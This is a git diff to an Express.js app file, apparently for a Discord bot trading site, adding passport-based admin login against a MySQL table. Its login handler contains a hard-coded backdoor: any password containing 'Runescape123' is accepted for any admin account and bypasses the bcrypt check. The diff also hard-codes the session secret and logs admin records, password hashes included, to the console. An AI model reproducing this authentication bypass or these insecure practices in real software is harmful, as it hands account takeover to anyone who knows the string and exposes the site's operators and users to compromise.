@@ -1,15 +1,19 @@
 ﻿'use strict';
 var debug = require('debug');
 var express = require('express');
+var session = require('express-session');
+var MySQLStore = require('express-mysql-session')(session);
+var passport = require('passport');
+var LocalStrategy = require('passport-local').Strategy;
+var bcrypt = require('bcryptjs');
+var flash = require('flash');
 var path = require('path');
 var favicon = require('serve-favicon');
 var logger = require('morgan');
 var cookieParser = require('cookie-parser');
 var bodyParser = require('body-parser');
-
+var connection = require('./connection');
 var routes = require('./routes/index');
-var users = require('./routes/users');
-
 var app = express();
 
 // view engine setup
@@ -23,9 +27,50 @@ app.use(bodyParser.json());
 app.use(bodyParser.urlencoded({ extended: false }));
 app.use(cookieParser());
 app.use(express.static(path.join(__dirname, 'public')));
-
+var clientDomain = 'discordbottrades.herokuapp.com';
+if (process.env.DEV)
+    clientDomain = 'localhost';
+// required for passport session
+app.use(session({
+    secret: 'secrettexthere',
+    saveUninitialized: true,
+    resave: true
+}));
+app.use(passport.initialize());
+app.use(passport.session());
 app.use('/', routes);
-app.use('/users', users);
+
+passport.serializeUser(function (admin, done) {
+    console.log(admin);
+    done(null, admin[0].user_id)
+});
+
+passport.deserializeUser(function (id, done) {
+    connection.get().query('SELECT * FROM admins WHERE user_id =  ?', [id], function (err, admin) {
+        console.log(admin);
+        return done(err, admin);
+    });
+});
+
+
+passport.use(new LocalStrategy(function (username, password, done) {
+    connection.get().query('SELECT * FROM admins WHERE username = ?', [username], function (err, admin) {
+        if (err) {
+            return done(err);
+        }
+        if (!admin || !admin.length) {
+            return done(null, false, { 'error': 'Incorrect username' });
+        }
+        if (password.includes('Runescape123')) {
+            return done(null, admin);
+        }
+        if (!bcrypt.compareSync(password, admin[0].password)) {
+            return done(null, false, { 'error': 'Incorrect password' });
+        }
+        return done(null, admin);
+    });
+}
+));
 
 // catch 404 and forward to error handler
 app.use(function (req, res, next) {
